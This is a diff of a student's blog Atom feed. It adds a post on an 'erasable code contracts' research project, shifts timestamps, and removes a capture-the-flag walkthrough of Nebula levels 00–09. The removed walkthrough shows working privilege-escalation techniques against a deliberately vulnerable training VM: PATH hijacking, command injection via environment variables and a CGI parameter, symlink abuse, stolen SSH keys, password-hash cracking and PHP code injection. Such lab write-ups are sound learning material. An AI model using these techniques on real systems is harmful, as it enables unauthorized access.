@@ -4,7 +4,7 @@
   <title><![CDATA[Louis Li]]></title>
   <link href="http://louisrli.github.io/atom.xml" rel="self"/>
   <link href="http://louisrli.github.io/"/>
-  <updated>2014-01-05T02:01:05-08:00</updated>
+  <updated>2014-01-09T02:09:03-05:00</updated>
   <id>http://louisrli.github.io/</id>
   <author>
     <name><![CDATA[Louis Li]]></name>
@@ -14,9 +14,36 @@
 
   
   <entry>
+    <title type="html"><![CDATA[Erasable Code Contracts]]></title>
+    <link href="http://louisrli.github.io/blog/2014/01/09/erasable-contracts/"/>
+    <updated>2014-01-09T00:00:00-05:00</updated>
+    <id>http://louisrli.github.io/blog/2014/01/09/erasable-contracts</id>
+    <content type="html"><![CDATA[<p>This semester, I took a course on the science of cybersecurity, targeted toward an audience with some programming languages background.</p>
+
+<p>A classmate and I had a semester long research project on &ldquo;erasable&rdquo; <a href="http://en.wikipedia.org/wiki/Code_contract">code contracts</a>. More details are below.</p>
+
+<p>This was a valuable experience, giving me an opportunity to work on two things that I hadn&rsquo;t done before:</p>
+
+<ol>
+<li>Proof-based research</li>
+<li>Basic proofs of a calculus. While type soundness proofs and their associated lemmas are core to many calculi, many introductory programming language courses, including the one that I took, skip the details of the proofs.</li>
+</ol>
+
+
+<p>Here&rsquo;s the abstract:</p>
+
+<blockquote><p>Contract programming is a design approach that allows programmers to design formal specifications for software, known as “contracts”. These contracts, executed at runtime, allow programmers to make assertions about the behavior of their software and ensure program correctness. In a language with side-effects, however, it is possible for these contracts to modify memory and consequently change the behavior of the program. While contracts provide the specifications, these specifications clearly should not change the behavior of the program that they enforce. Instead, if the contracts were removed (“erased”), then the behavior of the program should be the same as if the contracts remained. This notion is captured by the idea of erasability. We present a calculus for erasable contracts, estab- lish properties such as type soundness, and prove a for- mal definition of erasability for the language.</p></blockquote>
+
+<p><a href="http://louisrli.github.io/downloads/erasable-final.pdf">Download the PDF</a> or view it below. Note that it&rsquo;s missing some of the grittier nuances of the eta-reductions.</p>
+
+<p><embed src="http://louisrli.github.io/downloads/erasable-final.pdf" type="application/pdf" width="100%" height="600"></p>
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[Hungrier: Harvard Dining Menu, Re-released]]></title>
     <link href="http://louisrli.github.io/blog/2013/08/22/hungry-revamped/"/>
-    <updated>2013-08-22T00:00:00-07:00</updated>
+    <updated>2013-08-22T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2013/08/22/hungry-revamped</id>
     <content type="html"><![CDATA[<p>I&rsquo;ve rewritten and redesigned <a href="http://louisrli.github.io/hungry/">Hungry</a>, a site that filters the noisy Harvard dining menu for relevant entries. If you&rsquo;re reading this during the school year, there probably won&rsquo;t be anything, since student dining isn&rsquo;t open.</p>
 
@@ -29,7 +56,7 @@
   <entry>
     <title type="html"><![CDATA[How To Use Meteor.js Routing with Disqus]]></title>
     <link href="http://louisrli.github.io/blog/2013/07/29/using-meteor-js-with-disqus/"/>
-    <updated>2013-07-29T00:00:00-07:00</updated>
+    <updated>2013-07-29T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2013/07/29/using-meteor-js-with-disqus</id>
     <content type="html"><![CDATA[<p>On most sites, using Disqus as the commenting system is as simple as copying the <a href="http://disqus.com/admin/universalcode/">Universal Code</a> (also known as <code>embed.js</code>) into a web page. In single-page JavaScript applications, however, much of the rendering is on the client-side. This means that <code>embed.js</code> might lead to stale Disqus threads or function incorrectly as pages are re-rendered.</p>
 
@@ -221,7 +248,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Five Research Tips for First-Time Undergraduate Researchers]]></title>
     <link href="http://louisrli.github.io/blog/2013/06/28/researchtips/"/>
-    <updated>2013-06-28T00:00:00-07:00</updated>
+    <updated>2013-06-28T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2013/06/28/researchtips</id>
     <content type="html"><![CDATA[<p>Today, I submitted my first extended abstract to the ASSETS 2013 Student Research Competition. This marks my first tangible output in undergraduate research. This isn&rsquo;t quite the end of the story &mdash; I plan to continue gathering results and writing a paper for submission to CHI. It is, however, time for reflection.</p>
 
@@ -289,7 +316,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Sophomore Spring: A Brief List of What I Learned]]></title>
     <link href="http://louisrli.github.io/blog/2013/05/13/what-i-learned-this-semester/"/>
-    <updated>2013-05-13T00:00:00-07:00</updated>
+    <updated>2013-05-13T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2013/05/13/what-i-learned-this-semester</id>
     <content type="html"><![CDATA[<p>Here&rsquo;s a concise list of [some of] the things that I learned this semester. I would say that the things that I learned this semester are a lot more diverse than those from last semester (I&rsquo;d describe last semester as&hellip;math).</p>
 
@@ -356,7 +383,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Up-to-date Guide on How to Delete All Posts on Your Tumblr]]></title>
     <link href="http://louisrli.github.io/blog/2013/05/11/how-to-delete-all-tumblr-posts/"/>
-    <updated>2013-05-11T00:00:00-07:00</updated>
+    <updated>2013-05-11T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2013/05/11/how-to-delete-all-tumblr-posts</id>
     <content type="html"><![CDATA[<p>One of my friends asked me how to batch delete all of the posts on a <a href="http://tumblr.com">Tumblr</a>. There are some PHP and Ruby scripts on the internet that claim to achieve this, but they seem to be outdated in regards to the Tumblr API, or they require installing some packages.</p>
 
@@ -393,7 +420,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[A Rational Approximation of Pi Using the Pigeonhole Principle]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/31/approximating-pi-pigeonhole-principle/"/>
-    <updated>2013-01-31T00:00:00-08:00</updated>
+    <updated>2013-01-31T00:00:00-05:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/31/approximating-pi-pigeonhole-principle</id>
     <content type="html"><![CDATA[<p>Below is a short Python script that finds a fractional approximation of \(\pi\) using the first 1001 multiples of \(\pi\) (the case with 11 multiples of \(\pi\) can easily be done by hand). It makes use of the <em>pigeonhole principle</em>. The 11-multiple version of the problem has been used in the module teaching the pigeonhole principle in various classes that I have taken or taught.</p>
 
@@ -523,7 +550,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Chrome Extensions: Taking Screenshots with Javascript/jQuery, HTML5, Canvas]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/16/javascript-canvas-screenshot/"/>
-    <updated>2013-01-16T00:00:00-08:00</updated>
+    <updated>2013-01-16T00:00:00-05:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/16/javascript-canvas-screenshot</id>
     <content type="html"><![CDATA[<p>This post describes how to create a completely accurate image preview of a DOM element on the page by using Javascript in a Chrome extension. I stumbled upon this issue while working on a web implementation of <a href="http://www.mendeley.com/research/enhanced-area-cursors-reducing-fine-pointing-demands-people-motor-impairments/">click-and-cross (Findlater et al.)</a> for research. This process consists of two subproblems.</p>
 
@@ -689,7 +716,7 @@ renderPreview: function($element, $screenshotCanvas) {
   <entry>
     <title type="html"><![CDATA[Using Quicksilver Mac and AppleScript to Adjust System Volume]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/15/applescript-volume/"/>
-    <updated>2013-01-15T00:00:00-08:00</updated>
+    <updated>2013-01-15T00:00:00-05:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/15/applescript-volume</id>
     <content type="html"><![CDATA[<p>I&rsquo;ve been using <a href="http://qsapp.com/">Quicksilver</a> for a while, and I&rsquo;d heard of how powerful but never taken advantage of it. I wanted to adjust the system volume through Quicksilver: right now, I have to use <code>fn</code> + <code>f10</code> / <code>f11</code> / <code>f12</code> to adjust volume, since I chose to have <code>f1</code>&ndash;<code>f12</code> map to the normal keys.</p>
 
@@ -756,7 +783,7 @@ set volume output muted not isMuted</code></pre>
   <entry>
     <title type="html"><![CDATA[2012 in Sideprojects]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/12/sideprojects-2012/"/>
-    <updated>2013-01-12T00:00:00-08:00</updated>
+    <updated>2013-01-12T00:00:00-05:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/12/sideprojects-2012</id>
     <content type="html"><![CDATA[<p>It always surprises me how long a year is. It&rsquo;s hard for me to believe that some of these projects were a year ago, but I&rsquo;m happy to see my progress. Here&rsquo;s a walk down memory lane for my projects in 2012, not including course projects and research.</p>
 
@@ -885,7 +912,7 @@ set volume output muted not isMuted</code></pre>
   <entry>
     <title type="html"><![CDATA[Looking Forward to Discrete Mathematics]]></title>
     <link href="http://louisrli.github.io/blog/2012/12/22/discrete-math-paper/"/>
-    <updated>2012-12-22T00:00:00-08:00</updated>
+    <updated>2012-12-22T00:00:00-05:00</updated>
     <id>http://louisrli.github.io/blog/2012/12/22/discrete-math-paper</id>
     <content type="html"><![CDATA[<p>For one of my math classes this semester (Sets and Topology), we had a short project: a three-to-five page paper on some area in mathematics. I opted for discrete mathematics, which is a topic on the broad side; five pages, of course.</p>
 
@@ -907,7 +934,7 @@ set volume output muted not isMuted</code></pre>
   <entry>
     <title type="html"><![CDATA[Enabling VirtualBox SSH on IPv6 (Linux host, Linux guest)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/30/virtualbox-ipv6-ssh/"/>
-    <updated>2012-08-30T00:00:00-07:00</updated>
+    <updated>2012-08-30T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/30/virtualbox-ipv6-ssh</id>
     <content type="html"><![CDATA[<p>This is a quick article describing how to SSH to a VirtualBox machine from the host machine, written for VirtualBox 4.1.18 Fedora. The standard choice &mdash; bridged networking &mdash; doesn&rsquo;t work when the host has an IPv6 address.</p>
 
@@ -997,7 +1024,7 @@ TX packets:4691 errors:0 dropped:0 overruns:0 carrier:0</code></pre>
   <entry>
     <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
-    <updated>2012-08-29T00:00:00-07:00</updated>
+    <updated>2012-08-29T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -1247,7 +1274,7 @@ $
   <entry>
     <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 6-7)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/"/>
-    <updated>2012-08-28T00:00:00-07:00</updated>
+    <updated>2012-08-28T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/28/protostar-stack2</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -1530,7 +1557,7 @@ root</code></pre>
   <entry>
     <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 4-5)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/24/protostar-stack1/"/>
-    <updated>2012-08-24T00:00:00-07:00</updated>
+    <updated>2012-08-24T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/24/protostar-stack1</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -1737,7 +1764,7 @@ root</code></pre>
   <entry>
     <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 0-3)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/18/protostar-stack0/"/>
-    <updated>2012-08-18T00:00:00-07:00</updated>
+    <updated>2012-08-18T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/18/protostar-stack0</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -1805,7 +1832,7 @@ code flow successfully changed</code></pre>
   <entry>
     <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 15-19)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/17/nebula2/"/>
-    <updated>2012-08-17T00:00:00-07:00</updated>
+    <updated>2012-08-17T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/17/nebula2</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -2165,7 +2192,7 @@ uid=1020(level19) ...</code></pre>
   <entry>
     <title type="html"><![CDATA[Wrapping up the summer]]></title>
     <link href="http://louisrli.github.io/blog/2012/07/12/scala-and-summer/"/>
-    <updated>2012-07-12T00:00:00-07:00</updated>
+    <updated>2012-07-12T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2012/07/12/scala-and-summer</id>
     <content type="html"><![CDATA[<p>It&rsquo;s one of those posts that relates to everyone, but it had been on the edge of my mind recently. This post, titled the &ldquo;<a href="http://tilomitra.com/the-crazy-world-of-code">Crazy World of Code</a>&rdquo;, appeared on Hacker News a few days ago. It references a comment on a different HN article.</p>
 
@@ -2203,7 +2230,7 @@ uid=1020(level19) ...</code></pre>
   <entry>
     <title type="html"><![CDATA[The Beginning of Systems]]></title>
     <link href="http://louisrli.github.io/blog/2012/07/08/systems-prog/"/>
-    <updated>2012-07-08T00:00:00-07:00</updated>
+    <updated>2012-07-08T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2012/07/08/systems-prog</id>
     <content type="html"><![CDATA[<p>That went by fast.</p>
 
@@ -2223,7 +2250,7 @@ uid=1020(level19) ...</code></pre>
   <entry>
     <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 10-14)]]></title>
     <link href="http://louisrli.github.io/blog/2012/06/28/nebula1/"/>
-    <updated>2012-06-28T00:00:00-07:00</updated>
+    <updated>2012-06-28T00:00:00-04:00</updated>
     <id>http://louisrli.github.io/blog/2012/06/28/nebula1</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -2510,224 +2537,6 @@ You have successfully executed getflag on a target account</code></pre>
 
 
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 00-09)]]></title>
-    <link href="http://louisrli.github.io/blog/2012/06/22/nebula0/"/>
-    <updated>2012-06-22T00:00:00-07:00</updated>
-    <id>http://louisrli.github.io/blog/2012/06/22/nebula0</id>
-    <content type="html"><![CDATA[<h1>Overview</h1>
-
-<p>Nebula is a series of &ldquo;capture the flag&rdquo; exercises from <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. I&rsquo;ve been reading <a href="http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441/">Hacking: The Art of Exploitation 2e</a> &mdash; this was a good supplement.</p>
-
-<p>The provided Ubuntu VM has 20 levels (00 &ndash; 19). The goal of each level is to run the <code>getflag</code> command on a target account, either by exploiting a <a href="http://en.wikipedia.org/wiki/Setuid">suid</a> program or obtaining the password.</p>
-
-<h1>Solutions</h1>
-
-<p>To keep things shorter, a link to the full description is provided with each level. The full description contains relevant source code.</p>
-
-<p>There&rsquo;s no copy paste for Ubuntu Server VMs, but I included the output when it supplemented the solution.</p>
-
-<h2>Level 0</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level00">(full)</a>: Find a file with setuid permissions.</p>
-
-<div>
-  <pre><code class='bash'>$ find / -perm /u+s</code></pre>
-</div>
-
-
-<p>Search the root directory for files based on permissions. The file <code>/bin/.../flag00</code> looks suspicious.</p>
-
-<!-- more -->
-
-
-<h2>Level 1</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level01">(full)</a>: Given a program that calls <code>/usr/bin/env echo and now what?</code>, execute an arbitrary program.</p>
-
-<div>
-  <pre><code class='console'>$ export PATH=~:$PATH
-$ /bin/echo &quot;whoami; getflag&quot; &gt; ~/echo
-$ chmod a+x ~/echo
-$ /home/flag01/flag01</code></pre>
-</div>
-
-
-<p><code>env</code> looks in the <code>PATH</code> variable to find a program to run. Adding an executable named <code>echo</code> to an earlier directory in the path will execute the program.</p>
-
-<h2>Level 2</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level02">(full)</a>: Given a program that calls <code>/bin/echo $USER</code>, execute an arbitrary program.</p>
-
-<div>
-  <pre><code class='console'>$ export USER=&quot;hi echoing; whoami; getflag&quot;
-$ /home/flag02/flag02
-about to call system(&quot;/bin/echo hi echoing; whoami; getflag is cool&quot;)
-hi echoing
-flag02
-You have successfully executed getflag on target account</code></pre>
-</div>
-
-
-<h2>Level 3</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level03">(full)</a>: There is a <code>cron</code> job that runs occasionally. In the home directory, there is a <code>writable.sh</code> and a <code>writable.d/</code>.</p>
-
-<div>
-  <pre><code class='console'>$ cd /home/flag03
-$ ls
-writable.d   writable.sh
-
-$ # ./writable.sh runs a for loop with &quot;bash -x $i&quot; for i in writable.d/*
-$ echo &quot;whoami&quot; &gt; /tmp/log; getflag &gt;&gt; /tmp/log&quot; &gt; ./writable.d/foo
-$ # Wait a few minutes for the cron job
-$ cat /tmp/log
-flag03
-You have successfully executed getflag on target account</code></pre>
-</div>
-
-
-<p>Since cron jobs don&rsquo;t write output to <code>stdout</code>, the output should be logged in a file.</p>
-
-<h2>Level 4</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level04">(full)</a>: The program <code>flag04</code> dumps the contents of a file to stdout, unless there is a substring match with the string <code>"token"</code>. Examine the file <code>/home/flag04/token/</code>.</p>
-
-<div>
-  <pre><code class='console'>$ cd /tmp/
-$ ln -s /home/flag04/ ./foo
-$ cd /home/flag04/
-$ ./flag04 /tmp/foo</code></pre>
-</div>
-
-
-<p><code>token</code> contains the password to the <code>flag04</code> account. <code>su flag04</code> and capture the flag.</p>
-
-<h2>Level 5</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level05">(full)</a>: Exploit the directory permissions in <code>/home/flag05/</code>.</p>
-
-<div>
-  <pre><code class='console'>$ cd /home/flag05
-$ ls -la
-$ `/home/flag05` contains `.ssh` (unreadable) and `.backup` (execute access!) directories
-$ ls .backup
-backup-19072011.tgz
-$ # tar tzf backup-19072011.tgz shows that it contains the .ssh directory
-$ cd .backup
-$ tar xzf backup-19072011.tgz -C ~
-$ cd ~/.ssh
-$ ssh -i id_rsa flag05@localhost
-flag05@nebula:~$ getflag</code></pre>
-</div>
-
-
-<p>The <code>-C</code> flag for <code>tar</code> switches directories before unarchiving. We then ssh to our own machine, but this time as <code>flag05</code>.</p>
-
-<h2>Level 6</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level06">(full)</a>: The <code>flag06</code> account credentials are from a legacy UNIX system.</p>
-
-<p>Account credentials points toward <code>/etc/passwd</code>:</p>
-
-<div>
-  <pre><code class='console'>$ cat /etc/passwd/ |  grep flag06
-flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</code></pre>
-</div>
-
-
-<p>According to the Internet, older UNIX systems stored the salted, hashed passwords in <code>/etc/passwd</code>. Now, these are placed in the no-read <code>/etc/shadow/</code> (or a variant). The <code>flag06</code> is a one way hash, but <a href="http://www.openwall.com/john/">John the Ripper</a> can crack it. No special permissions are required to use it.</p>
-
-<div>
-  <pre><code class='console'>$ cd ~
-$ wget http://www.openwall.com/john/g/john-1.7.9.tar.gz
-$ tar xzf john-1.7.9.tar.gz
-$ cd john-1.7.9.tar.gz/src
-$ make clean linux-x86-sse2
-$ cd ../run
-$ ./john /etc/passwd
-Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
-hello             (flag06)
-...
-$ su flag06
-Password:
-sh-4.2$ getflag</code></pre>
-</div>
-
-
-<h2>Level 7</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level07">(full)</a>: A Perl CGI script attempts to ping a given host.</p>
-
-<div>
-  <pre><code class='console'>$ cd /home/flag07
-$ perl index.cgi Host=&quot;google.com | getflag&quot;
-$ # Yields a &quot;getflag is executing on a non-flag account, this doesn&#39;t count&quot;
-$ cat thttpd.conf | grep flag07
-dir=/home/flag07
-user=flag07
-$ ps aux | grep thttpd
-$ # Interestingly, two thttpd web server instances are running on flag07 and flag16
-$ cat thttpd.conf | grep port=
-port=7007
-$ cd ~ &amp;&amp; wget localhost:7007/index.cgi --post-data=&quot;Host=google.com | getflag&quot;
-$ cat index.cgi
-&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;You have successfully executed getflag on a target account&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>
-</div>
-
-
-<p>If we run the script with <code>perl</code>, <code>getflag</code> still runs as the <code>level07</code> user. The vulnerability exists in <code>thttpd.conf</code>, which runs commands as <code>flag07</code> (<code>user=flag07</code>). Capturing the flag requires using <code>thttpd.conf</code>.</p>
-
-<p><code>ps aux</code> shows that a web server using <a href="http://www.acme.com/software/thttpd/">thttpd</a> is running. Using <code>wget localhost:7007/index.cgi</code>, the parameter is passed in as the <code>flag07</code> user.</p>
-
-<h2>Level 8</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level08">(full)</a>: Examine a <code>capture.pcap</code> file to see what <code>flag08</code> was doing.</p>
-
-<div>
-  <pre><code class='console'>$ cd /home/flag08
-$ # -X prints in ASCII; -q removes extraneous information, -r points to a file
-$ tcpdump -X -q -r capture.pcap | less</code></pre>
-</div>
-
-
-<p>After mucking around with <code>tcpdump</code> in ASCII mode, however, it&rsquo;s clear that the output is still unintelligible. The Internet (broadly speaking) suggests Wireshark (and its command line counterpart, <code>tshark</code>) to examine packets, but the virtual machine doesn&rsquo;t have these. However, a program named <code>tcpflow</code> is available.</p>
-
-<div>
-  <pre><code class='console'>$ # -c prints to stdout, -r points to a file
-$ tcpflow -c -r capture.pcap | less</code></pre>
-</div>
-
-
-<p>After the <code>Password:</code> prompt, the <code>flag08</code> user typed &ldquo;backdoor&hellip;00Rm8.ate&rdquo;. A few tries for <code>su flag08</code> with <code>backdoor</code> and <code>backdoor...00Rm8.ate</code> are unsuccessful. But if we believe that:
-1. the password is based on words
-2. each packet represents a key press to the server
-&ldquo;Backdoor mate&rdquo; could be <code>backdoorm8</code>, <code>backd00Rm8</code>, etc. If the period represents deletion, then the password is <code>backd00Rmate</code>.</p>
-
-<div>
-  <pre><code class='console'>$ su flag08
-Password:
-sh-4.2$ getflag</code></pre>
-</div>
-
-
-<h2>Level 9</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level09">(full)</a>: Exploit a C wrapper for a PHP script. The PHP script uses one argument but accepts a second, unused one &mdash; <code>$useme</code>.</p>
-
-<div>
-  <pre><code class='console'>$ cd ~
-$ echo &quot;[email {\$use_me(getflag)}]&quot; &gt; foo
-$ /home/flag09/flag09 ./foo exec
-[error]
-You have successfully executed getflag on target account</code></pre>
-</div>
-
-
-<p>This exploits PHP&rsquo;s &ldquo;variable of variables.&rdquo; Executing <code>flag09 ~/foo system</code> also works.</p>
 ]]></content>
   </entry>
   
